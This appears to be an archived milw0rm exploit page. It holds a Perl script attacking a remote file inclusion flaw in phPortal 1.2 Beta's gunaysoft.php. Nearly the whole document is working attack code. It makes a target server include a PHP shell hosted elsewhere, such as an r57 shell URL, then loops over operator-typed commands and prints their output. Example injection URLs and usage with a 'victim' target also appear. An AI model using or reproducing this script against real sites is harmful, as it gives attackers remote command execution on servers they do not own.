<html><head><title>phPortal 1.2 Multiple Remote File Inclusions Exploit</title></head><pre>#!/usr/bin/perl

####################################################################################################
#                                                                                                       
# phportal_1.2_Beta (gunaysoft.php) Remote File Include Vulnerability                             
#                                                                                                 
# Discovered by : Ciph3r                        
#                                                                                                   
# Class:  Remote File Include Vulnerability                                                              
#                                                                                                  
# exemplary Exp: 
# http://www.site.com/sablonlar/gunaysoft/gunaysoft.php?icerikyolu=[shell]                 		 
# http://www.site.com/sablonlar/gunaysoft/gunaysoft.php?sayfaid=[shell]
# http://www.site.com/sablonlar/gunaysoft/gunaysoft.php?uzanti=[shell]
#                                                                                                
# Remote: Yes                                                                                            
#                                                                                                  
# Type:   Highly critical                                                                                
#                                                                                                        
# Vulnerable Code: include($icerikyolu.$sayfaid.$uzanti);                           
#                                                                                                        
# Download:  http://sourceforge.net/project/showfiles.php?group_id=205263                
#                                                                                                        
# SP tanx4: Iranian hacker &amp; Kurdish security TEAM                                                                 
#                                                                                                    
# sp TANX2: milw0rm.com &amp; google.com &amp; sourceforge.net     
#                                                                                                        
# Exploit: phportal.pl                                                                                
#                                                                                                        
# About phPortal : 
#
# phPortal is a Content Management System. phPortal contains phpBB2 core and
# phPortal shell. If you have a phpBB2 forum.You may upgrade to phPortal.
#                                                                                                    
######################################################################################################

use LWP::UserAgent;
use LWP::Simple;

$target = @ARGV[0];
$shellsite = @ARGV[1];
$shellcmd = @ARGV[2];
$file = &quot;sablonlar/gunaysoft/gunaysoft.php?uzanti=&quot;;

if(!$target || !$shellsite)
{
    usage();
}

header();

print &quot;Type 'exit' to quit&quot;;
print &quot;[cmd]\$&quot;;
$cmd = &lt;STDIN&gt;;

while ($cmd !~ &quot;exit&quot;)
{
    $xpl = LWP::UserAgent-&gt;new() or die;
        $req = HTTP::Request-&gt;new(GET=&gt;$target.$file.$shellsite.'?&amp;'.$shellcmd.'='.$cmd) or die(&quot;\n\n Failed to connect.&quot;);
        $res = $xpl-&gt;request($req);
        $r = $res-&gt;content;
        $r =~ tr/[\n]/[&amp;#234;]/;

    if (@ARGV[4] eq &quot;-r&quot;)
    {
        print $r;
    }
    elsif (@ARGV[5] eq &quot;-p&quot;)
    {
    # if not working change cmd variable to null and apply patch manually.
    $cmd = &quot;echo if(basename(__FILE__) == basename(\$_SERVER['PHP_SELF'])) die(); &gt;&gt; list_last.inc&quot;;
    print q
    {

    }
    }
    else
    {
    print &quot;[cmd]\$&quot;;
    $cmd = &lt;STDIN&gt;;
    }
}

sub header()
{
    print q
    {
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

                        Discovered by : Ciph3r
                  phportal.pl   - Remote File Include Exploit
                  SP tanx4: Iranian hacker &amp; Kurdish security TEAM
                          Ciph3r_blackhat@yahoo.com
                  sp TANX2: milw0rm.com &amp; google.com &amp; sourceforge.net
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    };
}

sub usage()
{
header();
    print q
    {
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Usage:
perl phportal.pl &lt;Target website&gt; &lt;Shell Location&gt; &lt;CMD Variable&gt; &lt;-r&gt; &lt;-p&gt;
&lt;Target Website&gt; - Path to target eg: www.victim.com
&lt;Shell Location&gt; - Path to shell eg: http://h1.ripway.com/boukan/r57.txt?                  
&lt;CMD Variable&gt; - Shell command variable name eg: Pwd
&lt;r&gt; - Show output from shell
&lt;p&gt; - sablonlar/gunaysoft/gunaysoft.php
Example:
perl phportal.pl  http://localhost/include http://localhost/r57.php cmd -r -p
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    };
exit();
}

# milw0rm.com [2008-07-02]</pre></html>